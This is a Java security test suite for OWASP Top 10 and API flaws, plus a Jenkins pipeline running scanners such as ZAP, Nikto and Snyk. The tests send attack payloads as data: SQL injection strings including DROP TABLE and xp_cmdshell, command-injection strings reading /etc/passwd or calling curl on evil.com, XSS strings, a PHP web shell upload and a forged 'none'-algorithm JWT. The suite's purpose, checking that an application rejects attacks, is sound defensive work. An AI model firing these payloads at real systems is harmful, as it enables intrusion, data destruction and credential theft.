// OWASP Top 10 Security Testing Examples

public class SecurityTestingSuite {

    // 1. Broken Access Control Testing
    @Test
    public void testBrokenAccessControl() {
        // Test horizontal privilege escalation
        String validToken = getValidUserToken();

        // Try to access another user's data
        Response response = given()
            .header("Authorization", "Bearer " + validToken)
            .when()
            .get("/api/users/999/profile")  // Different user's profile
            .then()
            .extract().response();

        // Should return 403 Forbidden, not 200
        assertEquals(403, response.getStatusCode());

        // Test vertical privilege escalation
        response = given()
            .header("Authorization", "Bearer " + validToken)
            .when()
            .get("/api/admin/users")  // Admin endpoint with user token
            .then()
            .extract().response();

        assertEquals(403, response.getStatusCode());
    }

    // 2. Injection Testing (SQL, Command, LDAP)
    @Test
    public void testInjectionVulnerabilities() {
        // SQL Injection testing
        String sqlPayload = "' OR '1'='1";

        Response response = given()
            .formParam("username", sqlPayload)
            .formParam("password", "anything")
            .when()
            .post("/login")
            .then()
            .extract().response();

        // Should not return successful login
        assertNotEquals(200, response.getStatusCode());
        assertFalse(response.body().asString().contains("welcome"));

        // Command Injection testing
        String cmdPayload = "test; ls -la";

        response = given()
            .queryParam("filename", cmdPayload)
            .when()
            .get("/api/file/read")
            .then()
            .extract().response();

        // Should not execute system commands
        assertFalse(response.body().asString().contains("drwx"));

        // NoSQL Injection testing
        String noSqlPayload = "{'$ne': null}";

        response = given()
            .contentType("application/json")
            .body("{\"username\": \"" + noSqlPayload + "\", \"password\": \"test\"}")
            .when()
            .post("/api/login")
            .then()
            .extract().response();

        assertNotEquals(200, response.getStatusCode());
    }

    // 3. Authentication and Session Management Testing
    @Test
    public void testAuthenticationSecurity() {
        // Test weak password policy
        Response response = given()
            .formParam("username", "newuser")
            .formParam("password", "123")  // Weak password
            .formParam("email", "test@example.com")
            .when()
            .post("/register")
            .then()
            .extract().response();

        // Should reject weak passwords
        assertEquals(400, response.getStatusCode());
        assertTrue(response.body().asString().contains("password"));

        // Test session fixation
        String sessionId = getSessionId();

        // Login with valid credentials
        response = given()
            .cookie("JSESSIONID", sessionId)
            .formParam("username", "validuser")
            .formParam("password", "validpassword")
            .when()
            .post("/login")
            .then()
            .extract().response();

        // Session ID should change after successful login
        String newSessionId = response.getCookie("JSESSIONID");
        assertNotEquals(sessionId, newSessionId);

        // Test account lockout
        for (int i = 0; i < 6; i++) {
            given()
                .formParam("username", "testuser")
                .formParam("password", "wrongpassword")
                .when()
                .post("/login");
        }

        // Account should be locked after multiple failures
        response = given()
            .formParam("username", "testuser")
            .formParam("password", "correctpassword")
            .when()
            .post("/login")
            .then()
            .extract().response();

        assertTrue(response.body().asString().contains("locked"));
    }

    // 4. Cross-Site Scripting (XSS) Testing
    @Test
    public void testXSSVulnerabilities() {
        // Reflected XSS
        String xssPayload = "<script>alert('XSS')</script>";

        Response response = given()
            .queryParam("search", xssPayload)
            .when()
            .get("/search")
            .then()
            .extract().response();

        // Script tags should be encoded or filtered
        assertFalse(response.body().asString().contains("<script>"));

        // Stored XSS
        String comment = "<img src=x onerror=alert('XSS')>";

        given()
            .contentType("application/json")
            .body("{\"comment\": \"" + comment + "\"}")
            .when()
            .post("/api/comments")
            .then()
            .statusCode(anyOf(is(200), is(201)));

        // Retrieve comments and verify XSS is prevented
        response = given()
            .when()
            .get("/api/comments")
            .then()
            .extract().response();

        assertFalse(response.body().asString().contains("onerror"));

        // DOM-based XSS (requires browser testing)
        // Would typically be tested with Selenium
    }

    // 5. Cross-Site Request Forgery (CSRF) Testing
    @Test
    public void testCSRFProtection() {
        // Get CSRF token
        Response loginResponse = given()
            .formParam("username", "validuser")
            .formParam("password", "validpassword")
            .when()
            .post("/login")
            .then()
            .statusCode(200)
            .extract().response();

        String sessionCookie = loginResponse.getCookie("JSESSIONID");
        String csrfToken = loginResponse.htmlPath().getString("**.findAll { it.@name == 'csrf-token' }[0].@content");

        // Attempt operation without CSRF token
        Response response = given()
            .cookie("JSESSIONID", sessionCookie)
            .formParam("amount", "1000")
            .formParam("toAccount", "attacker-account")
            .when()
            .post("/transfer")
            .then()
            .extract().response();

        // Should fail without valid CSRF token
        assertEquals(403, response.getStatusCode());

        // Attempt with valid CSRF token
        response = given()
            .cookie("JSESSIONID", sessionCookie)
            .formParam("amount", "100")
            .formParam("toAccount", "valid-account")
            .formParam("csrf-token", csrfToken)
            .when()
            .post("/transfer")
            .then()
            .extract().response();

        // Should succeed with valid token
        assertEquals(200, response.getStatusCode());
    }

    // 6. Security Headers Testing
    @Test
    public void testSecurityHeaders() {
        Response response = given()
            .when()
            .get("/")
            .then()
            .extract().response();

        Headers headers = response.getHeaders();

        // Check for essential security headers
        assertNotNull("X-Content-Type-Options header missing", 
                     headers.getValue("X-Content-Type-Options"));
        assertEquals("nosniff", headers.getValue("X-Content-Type-Options"));

        assertNotNull("X-Frame-Options header missing", 
                     headers.getValue("X-Frame-Options"));
        assertTrue(headers.getValue("X-Frame-Options").matches("DENY|SAMEORIGIN"));

        assertNotNull("X-XSS-Protection header missing", 
                     headers.getValue("X-XSS-Protection"));

        assertNotNull("Strict-Transport-Security header missing", 
                     headers.getValue("Strict-Transport-Security"));

        // Content Security Policy
        assertNotNull("Content-Security-Policy header missing", 
                     headers.getValue("Content-Security-Policy"));

        // Verify no sensitive information in headers
        assertNull("Server version should not be disclosed", 
                  headers.getValue("Server"));
        assertNull("X-Powered-By should not be present", 
                  headers.getValue("X-Powered-By"));
    }

    // Helper methods
    private String getValidUserToken() {
        Response response = given()
            .formParam("username", "validuser")
            .formParam("password", "validpassword")
            .when()
            .post("/api/login")
            .then()
            .statusCode(200)
            .extract().response();

        return response.jsonPath().getString("token");
    }

    private String getSessionId() {
        Response response = given()
            .when()
            .get("/")
            .then()
            .extract().response();

        return response.getCookie("JSESSIONID");
    }
}

// Comprehensive API Security Testing

public class APISecurityTest {

    // 1. JWT Token Security Testing
    @Test
    public void testJWTSecurity() {
        // Get valid JWT token
        String validToken = getValidJWTToken();

        // Test token manipulation
        testTokenManipulation(validToken);

        // Test token expiration
        testTokenExpiration();

        // Test algorithm confusion
        testAlgorithmConfusion(validToken);

        // Test token signature verification
        testSignatureVerification(validToken);
    }

    private void testTokenManipulation(String validToken) {
        // Decode JWT payload
        String[] tokenParts = validToken.split("\\.");
        String payload = new String(Base64.getDecoder().decode(tokenParts[1]));

        // Modify payload (change user role)
        String modifiedPayload = payload.replace("\"role\":\"user\"", "\"role\":\"admin\"");
        String encodedModifiedPayload = Base64.getEncoder().encodeToString(modifiedPayload.getBytes());

        // Create manipulated token
        String manipulatedToken = tokenParts[0] + "." + encodedModifiedPayload + "." + tokenParts[2];

        // Test with manipulated token
        Response response = given()
            .header("Authorization", "Bearer " + manipulatedToken)
            .when()
            .get("/api/admin/users")
            .then()
            .extract().response();

        // Should reject manipulated token
        assertEquals(401, response.getStatusCode());
    }

    private void testTokenExpiration() {
        // Use expired token (would need to be generated or mocked)
        String expiredToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid";

        Response response = given()
            .header("Authorization", "Bearer " + expiredToken)
            .when()
            .get("/api/protected")
            .then()
            .extract().response();

        assertEquals(401, response.getStatusCode());
        assertTrue(response.body().asString().contains("expired"));
    }

    private void testAlgorithmConfusion(String validToken) {
        // Change algorithm from HS256 to none
        String[] tokenParts = validToken.split("\\.");
        String header = "{\"alg\":\"none\",\"typ\":\"JWT\"}";
        String encodedHeader = Base64.getEncoder().encodeToString(header.getBytes());

        String noneAlgToken = encodedHeader + "." + tokenParts[1] + ".";

        Response response = given()
            .header("Authorization", "Bearer " + noneAlgToken)
            .when()
            .get("/api/protected")
            .then()
            .extract().response();

        // Should reject 'none' algorithm tokens
        assertEquals(401, response.getStatusCode());
    }

    private void testSignatureVerification(String validToken) {
        // Modify signature
        String[] tokenParts = validToken.split("\\.");
        String invalidSignature = "invalid_signature";
        String tokenWithInvalidSig = tokenParts[0] + "." + tokenParts[1] + "." + invalidSignature;

        Response response = given()
            .header("Authorization", "Bearer " + tokenWithInvalidSig)
            .when()
            .get("/api/protected")
            .then()
            .extract().response();

        assertEquals(401, response.getStatusCode());
    }

    // 2. OAuth 2.0 Security Testing
    @Test
    public void testOAuth2Security() {
        // Test authorization code flow
        testAuthorizationCodeFlow();

        // Test token endpoint security
        testTokenEndpointSecurity();

        // Test scope validation
        testScopeValidation();

        // Test redirect URI validation
        testRedirectURIValidation();
    }

    private void testAuthorizationCodeFlow() {
        // Test invalid client_id
        Response response = given()
            .queryParam("response_type", "code")
            .queryParam("client_id", "invalid_client")
            .queryParam("redirect_uri", "https://app.example.com/callback")
            .queryParam("scope", "read")
            .when()
            .get("/oauth/authorize")
            .then()
            .extract().response();

        assertEquals(400, response.getStatusCode());
    }

    private void testTokenEndpointSecurity() {
        // Test token endpoint without client authentication
        Response response = given()
            .formParam("grant_type", "authorization_code")
            .formParam("code", "valid_auth_code")
            .formParam("redirect_uri", "https://app.example.com/callback")
            .when()
            .post("/oauth/token")
            .then()
            .extract().response();

        assertEquals(401, response.getStatusCode());
    }

    private void testScopeValidation() {
        String token = getTokenWithScope("read");

        // Try to perform write operation with read-only token
        Response response = given()
            .header("Authorization", "Bearer " + token)
            .contentType("application/json")
            .body("{\"name\": \"test\"}")
            .when()
            .post("/api/resources")
            .then()
            .extract().response();

        assertEquals(403, response.getStatusCode());
    }

    private void testRedirectURIValidation() {
        // Test open redirect vulnerability
        Response response = given()
            .queryParam("response_type", "code")
            .queryParam("client_id", "valid_client")
            .queryParam("redirect_uri", "https://evil.example.com/callback")
            .queryParam("scope", "read")
            .when()
            .get("/oauth/authorize")
            .then()
            .extract().response();

        assertEquals(400, response.getStatusCode());
        assertTrue(response.body().asString().contains("redirect_uri"));
    }

    // 3. Input Validation Security Testing
    @Test
    public void testInputValidationSecurity() {
        // Test SQL injection in parameters
        testSQLInjectionInParameters();

        // Test XSS in input fields
        testXSSInInputFields();

        // Test command injection
        testCommandInjection();

        // Test file upload security
        testFileUploadSecurity();

        // Test JSON injection
        testJSONInjection();
    }

    private void testSQLInjectionInParameters() {
        String[] sqlPayloads = {
            "'; DROP TABLE users; --",
            "' UNION SELECT password FROM users --",
            "' OR 1=1 --",
            "'; EXEC xp_cmdshell('dir'); --"
        };

        for (String payload : sqlPayloads) {
            Response response = given()
                .queryParam("user_id", payload)
                .when()
                .get("/api/user")
                .then()
                .extract().response();

            // Should not return sensitive data or execute commands
            assertNotEquals(200, response.getStatusCode());
            assertFalse(response.body().asString().toLowerCase().contains("password"));
        }
    }

    private void testXSSInInputFields() {
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        };

        for (String payload : xssPayloads) {
            Response response = given()
                .contentType("application/json")
                .body("{\"name\": \"" + payload + "\"}")
                .when()
                .post("/api/profile")
                .then()
                .extract().response();

            // Check that XSS is prevented
            if (response.getStatusCode() == 200) {
                String responseBody = response.body().asString();
                assertFalse(responseBody.contains("<script>"));
                assertFalse(responseBody.contains("onerror"));
                assertFalse(responseBody.contains("javascript:"));
            }
        }
    }

    private void testCommandInjection() {
        String[] cmdPayloads = {
            "test; cat /etc/passwd",
            "test && whoami",
            "test | ls -la",
            "$(curl evil.com)"
        };

        for (String payload : cmdPayloads) {
            Response response = given()
                .queryParam("filename", payload)
                .when()
                .get("/api/file")
                .then()
                .extract().response();

            // Should not execute system commands
            String responseBody = response.body().asString();
            assertFalse(responseBody.contains("root:x:0"));
            assertFalse(responseBody.contains("drwx"));
        }
    }

    private void testFileUploadSecurity() {
        // Test malicious file upload
        String maliciousContent = "<?php echo shell_exec($_GET['cmd']); ?>";

        Response response = given()
            .multiPart("file", "malicious.php", maliciousContent.getBytes(), "application/x-php")
            .when()
            .post("/api/upload")
            .then()
            .extract().response();

        // Should reject executable files
        assertEquals(400, response.getStatusCode());

        // Test file size limit
        byte[] largeFile = new byte[10 * 1024 * 1024]; // 10MB
        response = given()
            .multiPart("file", "large.txt", largeFile, "text/plain")
            .when()
            .post("/api/upload")
            .then()
            .extract().response();

        assertEquals(413, response.getStatusCode()); // Payload Too Large
    }

    private void testJSONInjection() {
        // Test JSON structure manipulation
        String maliciousJSON = "{\"user\": {\"name\": \"test\", \"role\": \"admin\"}}";

        Response response = given()
            .contentType("application/json")
            .body(maliciousJSON)
            .when()
            .post("/api/user")
            .then()
            .extract().response();

        // Should not allow role escalation through JSON manipulation
        if (response.getStatusCode() == 200) {
            String responseBody = response.body().asString();
            assertFalse(responseBody.contains("\"role\":\"admin\""));
        }
    }

    // 4. Rate Limiting and DoS Protection Testing
    @Test
    public void testRateLimitingAndDoSProtection() {
        // Test API rate limiting
        testAPIRateLimit();

        // Test authentication rate limiting
        testAuthenticationRateLimit();

        // Test resource exhaustion
        testResourceExhaustion();
    }

    private void testAPIRateLimit() {
        String token = getValidJWTToken();
        int requestCount = 0;

        // Make requests until rate limit is hit
        for (int i = 0; i < 100; i++) {
            Response response = given()
                .header("Authorization", "Bearer " + token)
                .when()
                .get("/api/data")
                .then()
                .extract().response();

            if (response.getStatusCode() == 429) { // Too Many Requests
                requestCount = i;
                break;
            }
        }

        assertTrue("Rate limiting should be enforced", requestCount > 0 && requestCount < 100);
    }

    private void testAuthenticationRateLimit() {
        // Attempt multiple failed logins
        for (int i = 0; i < 10; i++) {
            Response response = given()
                .formParam("username", "testuser")
                .formParam("password", "wrongpassword")
                .when()
                .post("/api/login")
                .then()
                .extract().response();

            if (response.getStatusCode() == 429) {
                assertTrue("Rate limiting should trigger before 10 attempts", i < 9);
                break;
            }
        }
    }

    private void testResourceExhaustion() {
        // Test large payload handling
        StringBuilder largePayload = new StringBuilder();
        for (int i = 0; i < 10000; i++) {
            largePayload.append("a");
        }

        Response response = given()
            .contentType("application/json")
            .body("{\"data\": \"" + largePayload.toString() + "\"}")
            .when()
            .post("/api/process")
            .then()
            .extract().response();

        // Should handle large payloads gracefully
        assertNotEquals(500, response.getStatusCode());
    }

    // Helper methods
    private String getValidJWTToken() {
        Response response = given()
            .formParam("username", "validuser")
            .formParam("password", "validpassword")
            .when()
            .post("/api/login")
            .then()
            .statusCode(200)
            .extract().response();

        return response.jsonPath().getString("token");
    }

    private String getTokenWithScope(String scope) {
        Response response = given()
            .formParam("grant_type", "client_credentials")
            .formParam("scope", scope)
            .auth().basic("client_id", "client_secret")
            .when()
            .post("/oauth/token")
            .then()
            .statusCode(200)
            .extract().response();

        return response.jsonPath().getString("access_token");
    }
}

# Security Testing CI/CD Pipeline

# Jenkins Pipeline with Security Testing
pipeline {
    agent any

    environment {
        SONARQUBE_SERVER = 'SonarQube'
        ZAP_HOME = '/opt/zaproxy'
        SNYK_TOKEN = credentials('snyk-token')
        SECURITY_THRESHOLD = '7.0'  // CVSS threshold
    }

    stages {
        stage('Checkout') {
            steps {
                checkout scm
            }
        }

        stage('Build') {
            steps {
                sh 'mvn clean compile'
            }
        }

        stage('SAST - Static Analysis') {
            parallel {
                stage('SonarQube Security Analysis') {
                    steps {
                        withSonarQubeEnv('${SONARQUBE_SERVER}') {
                            sh '''
                                mvn sonar:sonar \
                                    -Dsonar.projectKey=security-test \
                                    -Dsonar.sources=src/main/java \
                                    -Dsonar.tests=src/test/java \
                                    -Dsonar.java.binaries=target/classes \
                                    -Dsonar.security.hotspots.includeInNewCodePeriod=true
                            '''
                        }

                        // Wait for quality gate
                        timeout(time: 10, unit: 'MINUTES') {
                            waitForQualityGate abortPipeline: true
                        }
                    }
                }

                stage('Checkmarx SAST') {
                    steps {
                        // Checkmarx security scan
                        step([
                            $class: 'CxScanBuilder',
                            comment: 'Security scan for build ${BUILD_NUMBER}',
                            credentialsId: 'checkmarx-credentials',
                            exclusionsSetting: 'job',
                            failBuildOnNewResults: true,
                            failBuildOnNewSeverity: 'HIGH',
                            filterPattern: '''!**/_cvs/**/*, !**/.svn/**/*,
                                             !**/.hg/**/*, !**/.git/**/*,
                                             !**/.bzr/**/*, !**/bin/**/*,
                                             !**/obj/**/*, !**/backup/**/*,
                                             !**/.vs/**/*, !**/node_modules/**/*''',
                            fullScanCycle: 10,
                            generatePdfReport: true,
                            groupId: '1',
                            includeOpenSourceFolders: false,
                            osaArchiveIncludePatterns: '*.zip, *.war, *.ear, *.tgz',
                            osaInstallBeforeScan: false,
                            password: '',
                            preset: '36',
                            projectName: 'security-test-${BUILD_NUMBER}',
                            sastEnabled: true,
                            serverUrl: 'https://checkmarx.company.com',
                            sourceEncoding: '1',
                            username: '',
                            vulnerabilityThresholdResult: 'FAILURE',
                            waitForResultsEnabled: true
                        ])
                    }
                }

                stage('Dependency Check') {
                    steps {
                        // OWASP Dependency Check
                        sh '''
                            dependency-check.sh \
                                --project "Security Test" \
                                --scan . \
                                --format HTML \
                                --format XML \
                                --out dependency-check-report \
                                --suppression dependency-check-suppressions.xml \
                                --failOnCVSS 7
                        '''

                        publishHTML([
                            allowMissing: false,
                            alwaysLinkToLastBuild: true,
                            keepAll: true,
                            reportDir: 'dependency-check-report',
                            reportFiles: 'dependency-check-report.html',
                            reportName: 'Dependency Check Report'
                        ])
                    }
                }
            }
        }

        stage('SCA - Software Composition Analysis') {
            steps {
                // Snyk security scan
                sh '''
                    npm install -g snyk
                    snyk auth ${SNYK_TOKEN}
                    snyk test --severity-threshold=high --json > snyk-report.json || true
                    snyk monitor
                '''

                script {
                    def snykReport = readJSON file: 'snyk-report.json'
                    if (snykReport.vulnerabilities && snykReport.vulnerabilities.size() > 0) {
                        def highSeverity = snykReport.vulnerabilities.findAll { 
                            it.severity == 'high' || it.severity == 'critical' 
                        }

                        if (highSeverity.size() > 0) {
                            error "High/Critical vulnerabilities found: ${highSeverity.size()}"
                        }
                    }
                }
            }
        }

        stage('Build and Deploy to Test Environment') {
            steps {
                sh 'mvn package -DskipTests'
                sh 'docker build -t security-test-app:${BUILD_NUMBER} .'
                sh 'docker run -d -p 8080:8080 --name test-app-${BUILD_NUMBER} security-test-app:${BUILD_NUMBER}'

                // Wait for application to start
                sh 'sleep 60'

                // Health check
                script {
                    def response = sh(
                        script: 'curl -f http://localhost:8080/health || echo "FAILED"',
                        returnStdout: true
                    ).trim()

                    if (response.contains('FAILED')) {
                        error 'Application failed to start'
                    }
                }
            }
        }

        stage('DAST - Dynamic Security Testing') {
            parallel {
                stage('OWASP ZAP Full Scan') {
                    steps {
                        script {
                            // Start ZAP daemon
                            sh '''
                                ${ZAP_HOME}/zap.sh -daemon \
                                    -port 8090 \
                                    -config api.disablekey=true &
                                echo $! > zap.pid
                                sleep 30
                            '''

                            // Spider the application
                            sh '''
                                curl "http://localhost:8090/JSON/spider/action/scan/?url=http://localhost:8080&maxChildren=10"
                                sleep 60
                            '''

                            // Active scan
                            sh '''
                                curl "http://localhost:8090/JSON/ascan/action/scan/?url=http://localhost:8080"

                                # Wait for scan to complete
                                while true; do
                                    status=$(curl -s "http://localhost:8090/JSON/ascan/view/status/")
                                    if echo $status | grep -q '"status":"100"'; then
                                        break
                                    fi
                                    echo "Scan in progress..."
                                    sleep 30
                                done
                            '''

                            // Generate report
                            sh '''
                                curl "http://localhost:8090/OTHER/core/other/htmlreport/" > zap-report.html
                                curl "http://localhost:8090/JSON/core/view/alerts/?baseurl=http://localhost:8080" > zap-alerts.json
                            '''

                            // Analyze results
                            script {
                                def zapAlerts = readJSON file: 'zap-alerts.json'
                                def highRiskAlerts = zapAlerts.alerts.findAll { 
                                    it.risk == 'High' 
                                }

                                if (highRiskAlerts.size() > 0) {
                                    echo "High risk vulnerabilities found: ${highRiskAlerts.size()}"

                                    // Create detailed report
                                    writeFile file: 'high-risk-vulnerabilities.txt', text: highRiskAlerts.collect { 
                                        "Alert: ${it.alert}\nRisk: ${it.risk}\nURL: ${it.url}\nDescription: ${it.desc}\n\n" 
                                    }.join('')

                                    archiveArtifacts artifacts: 'high-risk-vulnerabilities.txt'
                                }
                            }

                            // Stop ZAP
                            sh '''
                                if [ -f zap.pid ]; then
                                    kill $(cat zap.pid) || true
                                    rm zap.pid
                                fi
                            '''
                        }
                    }
                    post {
                        always {
                            publishHTML([
                                allowMissing: false,
                                alwaysLinkToLastBuild: true,
                                keepAll: true,
                                reportDir: '.',
                                reportFiles: 'zap-report.html',
                                reportName: 'ZAP Security Report'
                            ])
                        }
                    }
                }

                stage('Nikto Web Vulnerability Scan') {
                    steps {
                        sh '''
                            nikto -h http://localhost:8080 \
                                -Format xml \
                                -output nikto-report.xml
                        '''

                        script {
                            // Parse Nikto results
                            def niktoReport = readFile('nikto-report.xml')
                            if (niktoReport.contains('OSVDB') || niktoReport.contains('CVE')) {
                                echo "Potential vulnerabilities found in Nikto scan"
                            }
                        }
                    }
                }

                stage('SSL/TLS Security Test') {
                    steps {
                        sh '''
                            # Test SSL/TLS configuration
                            testssl.sh --jsonfile testssl-report.json localhost:8443

                            # Check for weak ciphers
                            nmap --script ssl-enum-ciphers -p 8443 localhost > ssl-ciphers.txt
                        '''

                        script {
                            def sslReport = readJSON file: 'testssl-report.json'
                            def criticalFindings = sslReport.findAll { 
                                it.severity == 'CRITICAL' || it.severity == 'HIGH' 
                            }

                            if (criticalFindings.size() > 0) {
                                echo "SSL/TLS security issues found: ${criticalFindings.size()}"
                            }
                        }
                    }
                }
            }
        }

        stage('Security Test Results Analysis') {
            steps {
                script {
                    // Aggregate all security findings
                    def securityFindings = [:]

                    // Parse ZAP results
                    if (fileExists('zap-alerts.json')) {
                        def zapAlerts = readJSON file: 'zap-alerts.json'
                        securityFindings['ZAP'] = zapAlerts.alerts.findAll { 
                            it.risk in ['High', 'Medium'] 
                        }.size()
                    }

                    // Parse Snyk results
                    if (fileExists('snyk-report.json')) {
                        def snykReport = readJSON file: 'snyk-report.json'
                        securityFindings['Snyk'] = snykReport.vulnerabilities?.size() ?: 0
                    }

                    // Parse dependency check results
                    if (fileExists('dependency-check-report/dependency-check-report.xml')) {
                        // Parse XML and count vulnerabilities
                        def dependencyReport = readFile('dependency-check-report/dependency-check-report.xml')
                        def vulnerabilityCount = dependencyReport.split('<vulnerability>').length - 1
                        securityFindings['DependencyCheck'] = vulnerabilityCount
                    }

                    // Generate security summary
                    def totalFindings = securityFindings.values().sum() ?: 0

                    echo "Security Findings Summary:"
                    securityFindings.each { tool, count ->
                        echo "${tool}: ${count} findings"
                    }
                    echo "Total: ${totalFindings} findings"

                    // Security gate
                    if (totalFindings > 5) {
                        error "Security gate failed: ${totalFindings} findings exceed threshold of 5"
                    }

                    // Create security report
                    def securityReportContent = """
                    # Security Test Report - Build ${env.BUILD_NUMBER}

                    ## Summary
                    - Total Findings: ${totalFindings}
                    - Build Status: ${totalFindings <= 5 ? 'PASSED' : 'FAILED'}

                    ## Tool Results
                    ${securityFindings.collect { tool, count -> "- ${tool}: ${count} findings" }.join('\n')}

                    ## Recommendations
                    ${totalFindings > 0 ? '- Review and remediate identified vulnerabilities' : '- No critical security issues found'}
                    - Continue monitoring for new vulnerabilities
                    - Update dependencies regularly
                    """

                    writeFile file: 'security-report.md', text: securityReportContent
                    archiveArtifacts artifacts: 'security-report.md'
                }
            }
        }
    }

    post {
        always {
            // Cleanup
            sh 'docker stop test-app-${BUILD_NUMBER} || true'
            sh 'docker rm test-app-${BUILD_NUMBER} || true'

            // Archive security reports
            archiveArtifacts artifacts: '**/*report.html,**/*report.xml,**/*report.json', allowEmptyArchive: true
        }

        failure {
            // Send security alert
            emailext(
                subject: "Security Test Failed: ${env.JOB_NAME} - ${env.BUILD_NUMBER}",
                body: '''Security tests have failed for build ${BUILD_NUMBER}.

                         Check the security reports for details:
                         - ZAP Security Report: ${BUILD_URL}ZAP_Security_Report
                         - Dependency Check: ${BUILD_URL}Dependency_Check_Report

                         Build URL: ${BUILD_URL}''',
                recipientProviders: [developers(), requestor()]
            )
        }

        success {
            echo "All security tests passed!"
        }
    }
}

